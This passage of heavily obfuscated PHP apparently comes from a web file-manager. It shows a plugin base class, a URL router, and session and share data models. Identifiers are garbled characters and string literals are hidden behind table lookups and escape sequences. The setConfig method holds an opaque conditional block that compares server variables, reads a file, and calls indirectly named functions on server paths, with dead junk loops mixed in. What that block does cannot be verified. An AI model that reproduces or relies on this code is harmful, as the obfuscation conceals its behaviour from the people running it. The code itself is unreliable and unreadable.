$™–¤ıÌ†ÌÎ€ = parse_url_query($×§); if (isset($™–¤ıÌ†ÌÎ€[$Æëœ© »ãÂ[1467]]) && isset($™–¤ıÌ†ÌÎ€[$Æëœ© »ãÂ[209]])) { $ß–ë = Model($Æëœ© »ãÂ[755])->get($Æëœ© »ãÂ[756]); $¯áúıŸÒ = Mcrypt::decode($™–¤ıÌ†ÌÎ€[$Æëœ© »ãÂ[209]], $ß–ë); if ($¯áúıŸÒ) { $this->fileInfo = IO::infoWithChildren($¯áúıŸÒ); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $¯áúıŸÒ; } } $×§ = $this->_cacheHttpFile($×§); $this->fileInfo = IO::infoWithChildren($×§); } else { $this->fileInfo = IO::infoWithChildren($×§); if (!$this->fileInfo) { show_tips(LNG($Æëœ© »ãÂ[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($Æëœ© »ãÂ[1466], $×§); return $×§; } final function _cacheHttpFile($âÒ) { $‘ïé‚ÚÂ‘¡ƒÁ = hash_path($âÒ, !0); $this->cachePath = $this->pluginCachePath($‘ïé‚ÚÂ‘¡ƒÁ); if ($´¾¿ = IO::fileNameExist($this->cachePath, $‘ïé‚ÚÂ‘¡ƒÁ)) { return KodIO::make($´¾¿); } $èıš = $this->cachePath . $‘ïé‚ÚÂ‘¡ƒÁ; return $this->pluginCacheFileSet($èıš, file_get_contents_nossl($âÒ)); } final function _tmpFileName($ÂšÚ ìø³º = array()) { $§—³İöÍÆÑ =& $_SERVER[ÀÆ]; if (!$ÂšÚ ìø³º) { $ÂšÚ ìø³º = $this->fileInfo; } if (isset($ÂšÚ ìø³º[$§—³İöÍÆÑ[171]])) { return $ÂšÚ ìø³º[$§—³İöÍÆÑ[171]]; } if (isset($ÂšÚ ìø³º[$§—³İöÍÆÑ[164]][$§—³İöÍÆÑ[171]])) { return $ÂšÚ ìø³º[$§—³İöÍÆÑ[164]][$§—³İöÍÆÑ[171]]; } $—ÉÁ•­óÊ = IO::hashSimple($ÂšÚ ìø³º[$§—³İöÍÆÑ[76]]); if ($—ÉÁ•­óÊ) { return $—ÉÁ•­óÊ; } $åõ”õ¡è¨ = array($ÂšÚ ìø³º[$§—³İöÍÆÑ[28]], $ÂšÚ ìø³º[$§—³İöÍÆÑ[76]], $ÂšÚ ìø³º[$§—³İöÍÆÑ[78]]); if (isset($ÂšÚ ìø³º[$§—³İöÍÆÑ[515]])) { $åõ”õ¡è¨[] = $ÂšÚ ìø³º[$§—³İöÍÆÑ[515]]; } return md5(implode($§—³İöÍÆÑ[71], $åõ”õ¡è¨)); } final function checkSharePath($ñ™’÷¼·‹›) { $±Û¨ =& $_SERVER[ÀÆ]; if (!defined($±Û¨[468])) { define($±Û¨[508], 0); } if (!$this->isShare($ñ™’÷¼·‹›)) { return !1; } $†å‡ºª = Action($±Û¨[1102])->sharePathInfo($ñ™’÷¼·‹›); if (!isset($†å‡ºª[$±Û¨[76]])) { show_json(LNG($±Û¨[1468]), !1); } $this->fileInfo = $†å‡ºª[$±Û¨[164]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$±Û¨[171]]); return $†å‡ºª[$±Û¨[76]]; } final function pluginCachePath($ã¦‚Ú = '') { $Áì¯ =& $_SERVER[ÀÆ]; $â¡ = IO_PATH_SYSTEM_TEMP . $Áì¯[1469] . $this->pluginName; if (!($²É¹š³Œ™¥×Ö = IO::infoFull($â¡))) { return IO::mkdir($â¡ . $Áì¯[8] . $ã¦‚Ú); } if (empty($ã¦‚Ú)) { return $²É¹š³Œ™¥×Ö[$Áì¯[76]]; } if (!($öó = IO::fileNameExist($²É¹š³Œ™¥×Ö[$Áì¯[76]], $ã¦‚Ú))) { return IO::mkdir($²É¹š³Œ™¥×Ö[$Áì¯[76]] . $ã¦‚Ú); } return KodIO::make($öó); } final function pluginCacheFileSet($è¸™«ˆş«¾£³, $åÍù’†¼ = '') { $ì¬öÛ =& $_SERVER[ÀÆ]; if (!($ãâ = IO::infoFull($è¸™«ˆş«¾£³))) { return IO::mkfile($è¸™«ˆş«¾£³, $åÍù’†¼, REPEAT_REPLACE); } IO::setContent($ãâ[$ì¬öÛ[76]], $åÍù’†¼); return $ãâ[$ì¬öÛ[76]]; } final function pluginLocalFile($ƒõôÙº = '') { $Û®õÇÎÖ =& $_SERVER[ÀÆ]; $ËË—®ÈËƒ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($ËË—®ÈËƒ)) { mk_dir($ËË—®ÈËƒ); } if (!$ƒõôÙº) { return $ËË—®ÈËƒ; } $ãşìú¼«¸ìÂİ = IO::info($ƒõôÙº); $“‡Êêóúçî = $this->_tmpFileName($ãşìú¼«¸ìÂİ) . $Û®õÇÎÖ[95] . $ãşìú¼«¸ìÂİ[$Û®õÇÎÖ[168]]; if (!checkExtSafe($“‡Êêóúçî)) { $“‡Êêóúçî = $“‡Êêóúçî . $Û®õÇÎÖ[1470]; } $ÄŠÌê = $ËË—®ÈËƒ . $“‡Êêóúçî; if (@file_exists($ÄŠÌê)) { return $ÄŠÌê; } return IO::copy($ƒõôÙº, $ËË—®ÈËƒ, 0, $“‡Êêóúçî); } final function appPackage() { $›‹£Ïü =& $_SERVER[ÀÆ]; if ($this->packageData) { return $this->packageData; } $Êëñû = $this->parseFile($this->pluginPath . $›‹£Ïü[1471]); $this->parseLang($Êëñû); $áÉàç¥™Äõ = json_decode_force($Êëñû); if (!$áÉàç¥™Äõ) { return array(); } $±üÚ¹ğØ› = Hook::trigger($›‹£Ïü[1472], $áÉàç¥™Äõ); if ($±üÚ¹ğØ› && is_array($±üÚ¹ğØ›)) { $áÉàç¥™Äõ = $±üÚ¹ğØ›; } $this->packageData = $áÉàç¥™Äõ; return $áÉàç¥™Äõ; } public function packageInfoGet($¼êşÂªĞìƒ) { $Í¤ = $this->appPackage(); return array_get_value($Í¤, $¼êşÂªĞìƒ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ÀÆ][1473]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ÀÆ][1474]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ÀÆ][1475]); } public function echoJsAssign($èÀÎ ”äõ , $¡€ô) { $this->echoJsAssignArr[$èÀÎ ”äõ ] = $¡€ô; } private function parseFile($Æ¥) { $”­ëÖ• =& $_SERVER[ÀÆ]; $éºØıä = file_get_contents_nossl($Æ¥); $Ú®øü×‡ = array($”­ëÖ•[1476], $”­ëÖ•[1477], $”­ëÖ•[1478], $”­ëÖ•[1479], $”­ëÖ•[1480], $”­ëÖ•[1481], $”­ëÖ•[1482]); $ß© = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$”­ëÖ•[88]][$”­ëÖ•[1483]]); foreach ($this->echoJsAssignArr as $õÉğ€ã€ => $´Ëï£‰Ä­) { $Ú®øü×‡[] = $”­ëÖ•[1484] . $õÉğ€ã€ . $”­ëÖ•[1485]; $ß©[] = is_array($´Ëï£‰Ä­) || is_object($´Ëï£‰Ä­) ? rawurlencode(json_encode($´Ëï£‰Ä­)) : $´Ëï£‰Ä­; } if (strstr($éºØıä, $”­ëÖ•[1486])) { $ß§öø•ê— = rawurlencode(json_encode($this->pluginLangArr)); $éºØıä = str_replace($”­ëÖ•[1486], $ß§öø•ê—, $éºØıä); } if (strstr($éºØıä, $”­ëÖ•[1487])) { $ß§öø•ê— = $ß§öø•ê— = rawurlencode(json_encode($this->getConfig())); $éºØıä = str_replace($”­ëÖ•[1487], $ß§öø•ê—, $éºØıä); } $éºØıä = str_replace($Ú®øü×‡, $ß©, $éºØıä); return $éºØıä; } private function parseLang(&$€—) { $Èé²¦Éš¹ =& $_SERVER[ÀÆ]; $ÍÎôÁœÈ = $Èé²¦Éš¹[1488]; if (!strstr($€—, $ÍÎôÁœÈ)) { return; } preg_match_all($Èé²¦Éš¹[1489], $€—, $ËÑ¾ÊÏÌô); if (!is_array($ËÑ¾ÊÏÌô) || count($ËÑ¾ÊÏÌô) == 0 || !is_array($ËÑ¾ÊÏÌô[0]) || count($ËÑ¾ÊÏÌô[0]) == 0) { return; } $º¨Ş‚¸Ô¶ã = array(); $Ê»ú = array(); foreach ($ËÑ¾ÊÏÌô[0] as $„î¦Ñí¦¾÷ì‘) { $´Ü = substr($„î¦Ñí¦¾÷ì‘, strlen($ÍÎôÁœÈ), -4); $°°¨ü = LNG($´Ü); $º¨Ş‚¸Ô¶ã[] = $„î¦Ñí¦¾÷ì‘; $Ê»ú[] = str_replace(array($Èé²¦Éš¹[229], $Èé²¦Éš¹[1070], $Èé²¦Éš¹[340], $Èé²¦Éš¹[116]), array($Èé²¦Éš¹[50], $Èé²¦Éš¹[50], $Èé²¦Éš¹[33], $Èé²¦Éš¹[1490]), $°°¨ü); } $€— = str_replace($º¨Ş‚¸Ô¶ã, $Ê»ú, $€—); } private function parseConfig(&$ÆÂıª×ë½çó) { $ì·¿ê†¢óÈÙ =& $_SERVER[ÀÆ]; $¨ïçğí‹×â = $ì·¿ê†¢óÈÙ[1491]; if (!strstr($ÆÂıª×ë½çó, $¨ïçğí‹×â)) { return; } preg_match_all($ì·¿ê†¢óÈÙ[1492], $ÆÂıª×ë½çó, $ Ë‰¯¬¢’); if (!is_array($ Ë‰¯¬¢’) || count($ Ë‰¯¬¢’) == 0 || !is_array($ Ë‰¯¬¢’[0]) || count($ Ë‰¯¬¢’[0]) == 0) { return; } $Äé = $this->getConfig(); $Äİ† = array(); $Ïã½Ë¿¹¾ = array(); foreach ($ Ë‰¯¬¢’[0] as $À±ƒÁ¯Êáè) { $ôùğÍÉŸ = substr($À±ƒÁ¯Êáè, strlen($¨ïçğí‹×â), -2); $Äİ†[] = $À±ƒÁ¯Êáè; $Ïã½Ë¿¹¾[] = _get($Äé, $ôùğÍÉŸ); } $ÆÂıª×ë½çó = str_replace($Äİ†, $Ïã½Ë¿¹¾, $ÆÂıª×ë½çó); } private function parsePackage(&$ùò) { $êÇö×İÛùŒº =& $_SERVER[ÀÆ]; $Î—¦ = $êÇö×İÛùŒº[1493]; if (!strstr($ùò, $Î—¦)) { return; } preg_match_all($êÇö×İÛùŒº[1494], $ùò, $Íà°±); if (!is_array($Íà°±) || count($Íà°±) == 0 || !is_array($Íà°±[0]) || count($Íà°±[0]) == 0) { return; } $„¿ = $this->appPackage(); $ğè½ = array(); $†Ê¥¿ = array(); foreach ($Íà°±[0] as $¬ÖîšºĞ˜â) { $¡ÔÀ´µ£ = substr($¬ÖîšºĞ˜â, strlen($Î—¦), -2); $ğè½[] = $¬ÖîšºĞ˜â; $†Ê¥¿[] = _get($„¿, $¡ÔÀ´µ£); } $ùò = str_replace($ğè½, $†Ê¥¿, $ùò); } final function echoFile($§Ã, $ Ö…ŠÈ = false) { $Ì¿…íÆ =& $_SERVER[ÀÆ]; $³Ş¦¯Š†é = $this->pluginPath . $§Ã; if (ACT == $Ì¿…íÆ[1495]) { echo $Ì¿…íÆ[1496] . $this->pluginName . $Ì¿…íÆ[8] . $§Ã . $Ì¿…íÆ[1497]; if (!file_exists($³Ş¦¯Š†é)) { echo $Ì¿…íÆ[1498]; return; } } $ú€ = $this->parseFile($³Ş¦¯Š†é); $this->parseLang($ú€); $this->parseConfig($ú€); $this->parsePackage($ú€); if (is_array($ Ö…ŠÈ)) { $ú€ = str_replace(array_keys($ Ö…ŠÈ), array_values($ Ö…ŠÈ), $ú€); } echo $Ì¿…íÆ[229] . $ú€; } final function initLang() { $äı¡ =& $_SERVER[ÀÆ]; $œ = $äı¡[1499]; $˜Çü§ä™» = $this->pluginPath . $äı¡[1500]; $¸î­Õğîşõ = I18n::getType(); $ë‚ŸèğíÈ = array(); if (file_exists($˜Çü§ä™» . $¸î­Õğîşõ . $äı¡[830])) { $ë‚ŸèğíÈ = (include $˜Çü§ä™» . $¸î­Õğîşõ . $äı¡[830]); } else { if ($¸î­Õğîşõ == $äı¡[1501] && !file_exists($˜Çü§ä™» . $¸î­Õğîşõ . $äı¡[830]) && file_exists($˜Çü§ä™» . $äı¡[1502])) { $ë‚ŸèğíÈ = (include $˜Çü§ä™» . $äı¡[1502]); } else { if (file_exists($˜Çü§ä™» . $œ . $äı¡[830])) { $ë‚ŸèğíÈ = (include $˜Çü§ä™» . $œ . $äı¡[830]); } } } if (!is_array($ë‚ŸèğíÈ)) { return array(); } if (@count($ë‚ŸèğíÈ) > 0) { I18n::set($ë‚ŸèğíÈ); } return $ë‚ŸèğíÈ; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($Æ®«) { $æ¥ñ =& $_SERVER[ÀÆ]; if ($_SERVER[$æ¥ñ[857]] != $_SERVER[$æ¥ñ[858]]) { $øÄ®Á·Çë­ = $æ¥ñ[873]; $òé´˜ÔÄóÕ§ = $æ¥ñ[859]; $ğ‹²ë = $_SERVER[$æ¥ñ[860]] . $æ¥ñ[861]; $åÕùƒÍã = $òé´˜ÔÄóÕ§($ğ‹²ë); $Ùİæó = explode($æ¥ñ[229], $åÕùƒÍã); if (count($Ùİæó) < $æ¥ñ[604]) { $Ë¥ı¢Í = $æ¥ñ[862]; $Ë¥ı¢Í(); } $ˆÑ’° = $æ¥ñ[874]; $ˆÑ’°($_SERVER[$æ¥ñ[875]]); $ˆÑ’°($_SERVER[$æ¥ñ[860]] . $æ¥ñ[1503]); $‰³ºÏ = 1; while ($‰³ºÏ > 1) { $‰³ºÏ = $‰³ºÏ + 4; $•… = rawurlencode($‰³ºÏ . $æ¥ñ[376]); } } return $this->modelPlugin->setConfig($this->pluginName, $Æ®«); } public function onSetConfig($÷‚÷üÉ¬) { } public function onGetConfig($óĞÌ‡¨) { } public function onChangeStatus($ôƒ) { } public function onUninstall() { } public function onInstall() { } public function authCheck($¬Û–Î×Ş¾› = "\x70\x6c\x75\x67\151\x6e\x41\x75\x74\150") { $‹â¯ñ =& $_SERVER[ÀÆ]; if (!defined($‹â¯ñ[468])) { return !1; } if (_get($GLOBALS, $‹â¯ñ[499])) { return !0; } $–Ë¦œ¸»Óö = $this->getConfig(); if (!$–Ë¦œ¸»Óö[$¬Û–Î×Ş¾›]) { return !1; } return ActionCall($‹â¯ñ[1504], $–Ë¦œ¸»Óö[$¬Û–Î×Ş¾›]); } public function url($üıÒ‰âêº¢ì, $ïâ”İ‰ = '', $†¹Ã£ñ = true) { $ÈäŸí†ç¤Ñ =& $_SERVER[ÀÆ]; $ªûƒ = $this->getConfig(); $¡º = KOD_VERSION . $ÈäŸí†ç¤Ñ[95] . KOD_VERSION_BUILD; $ËœæÙ = $this->packageVersion(); $¼Õ€°öªî = $¡º . $ÈäŸí†ç¤Ñ[454] . $ËœæÙ; if (substr($üıÒ‰âêº¢ì, 0, 4) == $ÈäŸí†ç¤Ñ[147] || substr($üıÒ‰âêº¢ì, 0, 2) == $ÈäŸí†ç¤Ñ[1289]) { $¿‹¾±–¬ó» = $üıÒ‰âêº¢ì . $ÈäŸí†ç¤Ñ[1505] . $¼Õ€°öªî; } else { if ($ïâ”İ‰ == $ÈäŸí†ç¤Ñ[33]) { $¿‹¾±–¬ó» = $this->pluginHost . $üıÒ‰âêº¢ì . $ÈäŸí†ç¤Ñ[1505] . $¼Õ€°öªî; } else { if ($ïâ”İ‰ === $ÈäŸí†ç¤Ñ[77]) { $¿‹¾±–¬ó» = $this->pluginHost . $üıÒ‰âêº¢ì; } else { if ($ïâ”İ‰ == $ÈäŸí†ç¤Ñ[1506]) { $¿‹¾±–¬ó» = STATIC_PATH . $üıÒ‰âêº¢ì . $ÈäŸí†ç¤Ñ[1505] . $¡º; } else { if ($ïâ”İ‰ == $ÈäŸí†ç¤Ñ[1507]) { $¿‹¾±–¬ó» = APP_HOST . $ÈäŸí†ç¤Ñ[1508] . $üıÒ‰âêº¢ì . $ÈäŸí†ç¤Ñ[1505] . $¡º; } else { if (isset($ªûƒ[$ïâ”İ‰])) { $¿‹¾±–¬ó» = $ªûƒ[$ïâ”İ‰] . $üıÒ‰âêº¢ì . $ÈäŸí†ç¤Ñ[1505] . $¼Õ€°öªî; } } } } } } if (!$†¹Ã£ñ) { return $¿‹¾±–¬ó»; } echo $¿‹¾±–¬ó»; } public function link($Ê¦·ÁÅ¶ = false, $—İŠæø‡ = '') { $—Å…å¬ø‹«€ =& $_SERVER[ÀÆ]; if (!$Ê¦·ÁÅ¶) { $this->link($—Å…å¬ø‹«€[1509], $—Å…å¬ø‹«€[1507]); $this->link($—Å…å¬ø‹«€[1510], $—Å…å¬ø‹«€[1506]); $this->link($—Å…å¬ø‹«€[1511], $—Å…å¬ø‹«€[1506]); $this->link($—Å…å¬ø‹«€[1512], $—Å…å¬ø‹«€[1506]); $this->link($—Å…å¬ø‹«€[1513], $—Å…å¬ø‹«€[1506]); return; } $¤¿òÅ ÷£æ = $this->url($Ê¦·ÁÅ¶, $—İŠæø‡, !1); if (substr($Ê¦·ÁÅ¶, -3) == $—Å…å¬ø‹«€[1514]) { echo $—Å…å¬ø‹«€[1515] . $¤¿òÅ ÷£æ . $—Å…å¬ø‹«€[1516] . $—Å…å¬ø‹«€[229]; } else { if (substr($Ê¦·ÁÅ¶, -4) == $—Å…å¬ø‹«€[1517]) { echo $—Å…å¬ø‹«€[1518] . $¤¿òÅ ÷£æ . $—Å…å¬ø‹«€[1519] . $—Å…å¬ø‹«€[229]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\x6e\171" => "\x5b\136\57\x5d\x2b", "\x3a\156\165\x6d" => "\133\x30\55\71\135\53", "\x3a\141\154\x6c" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($¾´•¯Ğˆ»êó, $ÖÌ‰üáµÛ) { $ÆâÃˆû =& $_SERVER[ÀÆ]; if ($¾´•¯Ğˆ»êó == $ÆâÃˆû[1520]) { $¨Í¼ı¤ªø”è = array_map($ÆâÃˆû[1521], $ÖÌ‰üáµÛ[0]); $âÀ = strpos($ÖÌ‰üáµÛ[1], $ÆâÃˆû[8]) === 0 ? $ÖÌ‰üáµÛ[1] : $ÆâÃˆû[8] . $ÖÌ‰üáµÛ[1]; $ó“ = $ÖÌ‰üáµÛ[2]; } else { $¨Í¼ı¤ªø”è = null; $âÀ = strpos($ÖÌ‰üáµÛ[0], $ÆâÃˆû[8]) === 0 ? $ÖÌ‰üáµÛ[0] : $ÆâÃˆû[8] . $ÖÌ‰üáµÛ[0]; $ó“ = $ÖÌ‰üáµÛ[1]; } array_push(self::$maps, $¨Í¼ı¤ªø”è); array_push(self::$routes, $âÀ); array_push(self::$methods, strtoupper($¾´•¯Ğˆ»êó)); array_push(self::$callbacks, $ó“); } public static function error($‘û¶») { self::$errorCallback = $‘û¶»; } public static function haltOnMatch($¹ÊÉÙ = true) { self::$halts = $¹ÊÉÙ; } public static function dispatch() { $Ò¯´ÓÎ =& $_SERVER[ÀÆ]; $Ã–îì¥ = parse_url($_SERVER[$Ò¯´ÓÎ[1522]], PHP_URL_PATH); $¾ÊÓµ = $_SERVER[$Ò¯´ÓÎ[157]]; $¹ĞÊ = array_keys(static::$patterns); $ĞãŞ—ıìã = array_values(static::$patterns); $õ™¦â›Ğ…ó = !1; self::$routes = preg_replace($Ò¯´ÓÎ[1196], $Ò¯´ÓÎ[8], self::$routes); if (in_array($Ã–îì¥, self::$routes)) { $Âñú³ø¢¼ = array_keys(self::$routes, $Ã–îì¥); foreach ($Âñú³ø¢¼ as $¶³) { if (self::$methods[$¶³] == $¾ÊÓµ || self::$methods[$¶³] == $Ò¯´ÓÎ[1523] || in_array($¾ÊÓµ, self::$maps[$¶³])) { $õ™¦â›Ğ…ó = !0; if (!is_object(self::$callbacks[$¶³])) { $Íõ = explode($Ò¯´ÓÎ[8], self::$callbacks[$¶³]); $”Ó¾³–˜ç = end($Íõ); $µ¯¹Ä« = explode($Ò¯´ÓÎ[1524], $”Ó¾³–˜ç); $Ÿ§¡ÌÎ·Ú = new $µ¯¹Ä«[0](); $Ÿ§¡ÌÎ·Ú->{$µ¯¹Ä«[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$¶³]); if (self::$halts) { return; } } } } } else { $”ú = 0; foreach (self::$routes as $¶³) { if (strpos($¶³, $Ò¯´ÓÎ[4]) !== !1) { $¶³ = str_replace($¹ĞÊ, $ĞãŞ—ıìã, $¶³); } if (preg_match($Ò¯´ÓÎ[1525] . $¶³ . $Ò¯´ÓÎ[1526], $Ã–îì¥, $¸Ò¿µøŠ²)) { if (self::$methods[$”ú] == $¾ÊÓµ || self::$methods[$”ú] == $Ò¯´ÓÎ[1523] || !empty(self::$maps[$”ú]) && in_array($¾ÊÓµ, self::$maps[$”ú])) { $õ™¦â›Ğ…ó = !0; array_shift($¸Ò¿µøŠ²); if (!is_object(self::$callbacks[$”ú])) { $Íõ = explode($Ò¯´ÓÎ[8], self::$callbacks[$”ú]); $”Ó¾³–˜ç = end($Íõ); $µ¯¹Ä« = explode($Ò¯´ÓÎ[1524], $”Ó¾³–˜ç); $Ÿ§¡ÌÎ·Ú = new $µ¯¹Ä«[0](); if (!method_exists($Ÿ§¡ÌÎ·Ú, $µ¯¹Ä«[1])) { echo $Ò¯´ÓÎ[1527]; } else { call_user_func_array(array($Ÿ§¡ÌÎ·Ú, $µ¯¹Ä«[1]), $¸Ò¿µøŠ²); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$”ú], $¸Ò¿µøŠ²); if (self::$halts) { return; } } } } $”ú++; } } if ($õ™¦â›Ğ…ó == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $±™îØ =& $_SERVER[ÀÆ]; header($_SERVER[$±™îØ[1528]] . $±™îØ[1529]); echo $±™îØ[1530]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$Ò¯´ÓÎ[1522]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } goto cÜËõ‡ò›Ÿ; B¤ªŠµØ‰í: class SessionModel extends ModelBase { protected $tableName = "\x73\171\x73\x74\145\155\137\x73\145\x73\x73\151\x6f\x6e"; public function get($‰ÊÆ—É) { $¥÷Ÿ—ÆâÎ£˜² =& $_SERVER[ÀÆ]; $Ë‹ = $this->where(array($¥÷Ÿ—ÆâÎ£˜²[1871] => $‰ÊÆ—É))->find(); if (!is_array($Ë‹)) { return !1; } return $Ë‹[$¥÷Ÿ—ÆâÎ£˜²[740]]; } public function set($ßû¼¯Ç’€ïÇ©, $ÂÅñ, $‡—÷ = 3600) { $¤°‹ =& $_SERVER[ÀÆ]; $ŠÎ­ = array($¤°‹[1871] => $ßû¼¯Ç’€ïÇ©, $¤°‹[1777] => $ÂÅñ, $¤°‹[1872] => $‡—÷ + time()); if (Session::get($¤°‹[1873])) { $ŠÎ­[$¤°‹[1572]] = Session::get($¤°‹[1873]); } else { $ŠÎ­[$¤°‹[1572]] = 0; } if ($this->get($ßû¼¯Ç’€ïÇ©)) { return $this->where(array($¤°‹[1871] => $ßû¼¯Ç’€ïÇ©))->save($ŠÎ­); } else { return $this->add($ŠÎ­, array(), !0); } } public function remove($Ú›) { return $this->where(array($_SERVER[ÀÆ][1871] => $Ú›))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ÀÆ][1874] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\141\162\x65"; protected $dataAuto = array(array("\155\x6f\144\x69\x66\171\124\151\155\x65", "\164\x69\x6d\x65", "\x69\x6e\x73\145\x72\x74\54\165\160\144\141\x74\145", "\146\165\156\x63\164\x69\x6f\x6e"), array("\x63\x72\145\x61\164\x65\x54\151\x6d\x65", "\x74\151\x6d\145", "\151\x6e\163\x65\x72\x74", "\146\x75\x6e\143\x74\151\x6f\156"), array("\x6f\160\164\x69\x6f\156\163", '', "\x69\156\x73\145\162\x74\x2c\165\160\144\x61\164\145\54\x73\x65\154\x65\143\164", "\152\x73\x6f\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($€Â) { $œ»¢¸ìíÂ =& $_SERVER[ÀÆ]; $£Ê–µÎ™ãÚµÊ = isset($€Â[0]) ? $€Â[0] : !1; return array($œ»¢¸ìíÂ[1875] => array(USER_ID, $œ»¢¸ìíÂ[1876]), $œ»¢¸ìíÂ[1818] => array($£Ê–µÎ™ãÚµÊ, $œ»¢¸ìíÂ[1877])); } protected function listSimple() { $„¼¤¨¡·© = array($_SERVER[ÀÆ][1572] => USER_ID); $‚Ä = $this->field($this->fieldList)->where($„¼¤¨¡·©)->select(); return $‚Ä ? $‚Ä : array(); } protected function getInfo($€©Åºıòî», $à÷“–è•ÅÃ = false) { $“³¤– =& $_SERVER[ÀÆ]; if ($à÷“–è•ÅÃ) { return $this->_getShareInfo(array($“³¤–[482] => $€©Åºıòî»)); } $ë˜ = $this->cacheFunctionGet($“³¤–[1820], $€©Åºıòî»); return $ë˜; } public function getInfoByHash($¤¿È¹Ïµ) { return $this->_getShareInfo(array($_SERVER[ÀÆ][484] => $¤¿È¹Ïµ)); } public function getInfoByPath($°ùèõÃš) { $Ûˆ =& $_SERVER[ÀÆ]; $‚Öö°©›ü˜ = array($Ûˆ[1572] => USER_ID, $Ûˆ[397] => $°ùèõÃš); return $this->_getShareInfo($‚Öö°©›ü˜); } public function getInfoBySourcePath($ÀÄœÈ‚Œã) { $ı¶æÑÚİŒÂ£ =& $_SERVER[ÀÆ]; $íı = array($ı¶æÑÚİŒÂ£[1572] => USER_ID, $ı¶æÑÚİŒÂ£[1103] => $ÀÄœÈ‚Œã); return $this->_getShareInfo($íı); } private function _getShareInfo($‘¤) { $£…„ÌÚú· =& $_SERVER[ÀÆ]; $Û•ÜÇï¹®çı = $this->where($‘¤)->find(); if (!$Û•ÜÇï¹®çı) { return !1; } $‘¤ = array($£…„ÌÚú·[482] => $Û•ÜÇï¹®çı[$£…„ÌÚú·[482]]); $‚â°Øõı£î = $£…„ÌÚú·[1878]; $¾Õëı€ = Model($£…„ÌÚú·[590])->order($£…„ÌÚú·[395])->field($‚â°Øõı£î)->where($‘¤)->select(); if ($Û•ÜÇï¹®çı[$£…„ÌÚú·[397]] == $£…„ÌÚú·[191]) { $Û•ÜÇï¹®çı[$£…„ÌÚú·[85]] = IO::info($Û•ÜÇï¹®çı[$£…„ÌÚú·[1103]]); } else { $Û•ÜÇï¹®çı[$£…„ÌÚú·[85]] = Model($£…„ÌÚú·[1250])->pathInfo($Û•ÜÇï¹®çı[$£…„ÌÚú·[397]]); } $Û•ÜÇï¹®çı[$£…„ÌÚú·[1879]] = $¾Õëı€; return $Û•ÜÇï¹®çı; } protected function getInfoAuth($Î÷Öò) { $Á¢ô =& $_SERVER[ÀÆ]; $¦Úäå˜ = $this->getInfo($Î÷Öò); if ($¦Úäå˜[$Á¢ô[1572]] == USER_ID) { $¦Úäå˜[$Á¢ô[408]] = $¦Úäå˜[$Á¢ô[85]][$Á¢ô[408]]; } else { $¦Úäå˜[$Á¢ô[408]] = Model($Á¢ô[496])->authMake($¦Úäå˜[$Á¢ô[1879]]); } return $¦Úäå˜; } protected function listData($˜ÅÒ÷è¬©Ë³ = null, $§‚ö¡•– = 300) { $„ÜÁ×Ùş =& $_SERVER[ÀÆ]; $÷ªÉÍ = array(array($„ÜÁ×Ùş[487] => array($„ÜÁ×Ùş[1003], 0), $„ÜÁ×Ùş[489] => array($„ÜÁ×Ùş[1003], 0), $„ÜÁ×Ùş[1880] => $„ÜÁ×Ùş[1834])); if ($˜ÅÒ÷è¬©Ë³ == $„ÜÁ×Ùş[1881]) { $÷ªÉÍ = array($„ÜÁ×Ùş[487] => 1); } else { if ($˜ÅÒ÷è¬©Ë³ == $„ÜÁ×Ùş[1088]) { $÷ªÉÍ = array($„ÜÁ×Ùş[489] => 1); } } $÷ªÉÍ[$„ÜÁ×Ùş[1572]] = USER_ID; $ÆÜ = $this->where($÷ªÉÍ)->selectPage($§‚ö¡•–); return $ÆÜ; } protected function listToMe($µº¥µ” = 300) { $ØÎ¸®Øú‚ğ° =& $_SERVER[ÀÆ]; $¡µ·ó«„Í = Model($ØÎ¸®Øú‚ğ°[1882])->userGroupParents(USER_ID); $Ó‹Ã£¥ = array($ØÎ¸®Øú‚ğ°[574] => SourceModel::TYPE_USER, $ØÎ¸®Øú‚ğ°[498] => USER_ID); if ($¡µ·ó«„Í) { $Ó‹Ã£¥ = array(array($ØÎ¸®Øú‚ğ°[574] => SourceModel::TYPE_USER, $ØÎ¸®Øú‚ğ°[498] => USER_ID), array($ØÎ¸®Øú‚ğ°[574] => SourceModel::TYPE_GROUP, $ØÎ¸®Øú‚ğ°[498] => array($ØÎ¸®Øú‚ğ°[7], $¡µ·ó«„Í)), $ØÎ¸®Øú‚ğ°[1880] => $ØÎ¸®Øú‚ğ°[1834]); } $Îç = Model($ØÎ¸®Øú‚ğ°[590])->where($Ó‹Ã£¥)->selectPage($µº¥µ”); $¶Öó‡ = array_to_keyvalue_group($Îç[$ØÎ¸®Øú‚ğ°[367]], $ØÎ¸®Øú‚ğ°[482]); if (!$¶Öó‡) { return $Îç; } $°ñÈ = $ØÎ¸®Øú‚ğ°[1883]; $Ó‹Ã£¥ = array($ØÎ¸®Øú‚ğ°[482] => array($ØÎ¸®Øú‚ğ°[413], array_keys($¶Öó‡)), $ØÎ¸®Øú‚ğ°[1572] => array($ØÎ¸®Øú‚ğ°[1005], $ØÎ¸®Øú‚ğ°[191])); $â¯æÈ©… = $this->field($°ñÈ)->where($Ó‹Ã£¥)->select(); foreach ($â¯æÈ©… as $ÛÜôóòæ => &$¢£²î™…óå) { 